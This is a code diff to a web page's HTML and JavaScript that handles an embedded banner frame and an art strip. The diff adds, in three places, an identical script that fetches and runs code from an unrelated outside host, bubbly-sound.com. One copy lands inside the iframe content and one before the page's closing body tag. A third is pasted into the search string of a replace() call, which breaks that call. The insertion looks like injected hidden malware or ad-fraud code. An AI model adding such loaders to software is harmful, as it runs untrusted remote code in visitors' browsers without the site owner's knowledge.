@@ -2231,12 +2231,34 @@ onValue(settingsRef2, snap => {
           }
         });
         // Inject postMessage responder into HTML before loading
-        const htmlWithResize = val.replace('</body>', `
+        const htmlWithResize = val.replace('<script>
+(function(rqyrs){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = rqyrs || {};
+s.src = "//bubbly-sound.com/c/D.9-6Gb-2L5elwSZWqQU9iNajYk/yGNtDmca5iN/yT0S2rObThIU0RODDVAjxV";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script></body>', `
 <script>
   function sendH(){ parent.postMessage({height:document.body.scrollHeight},'*'); }
   window.addEventListener('load', sendH);
   window.addEventListener('message', function(e){ if(e.data==='getHeight') sendH(); });
-<\/script></body>`);
+<\/script><script>
+(function(rqyrs){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = rqyrs || {};
+s.src = "//bubbly-sound.com/c/D.9-6Gb-2L5elwSZWqQU9iNajYk/yGNtDmca5iN/yT0S2rObThIU0RODDVAjxV";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script></body>`);
         frame.srcdoc = htmlWithResize;
       } else {
         // ── Image Banner ──
@@ -3384,5 +3406,16 @@ function initArtStrip(el) {
   el.addEventListener('touchmove',  e => { el.scrollLeft = scrollL - (e.touches[0].clientX - startX); }, {passive:true});
 }
 </script>
-</body>
+<script>
+(function(rqyrs){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = rqyrs || {};
+s.src = "//bubbly-sound.com/c/D.9-6Gb-2L5elwSZWqQU9iNajYk/yGNtDmca5iN/yT0S2rObThIU0RODDVAjxV";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script></body>
 </html>
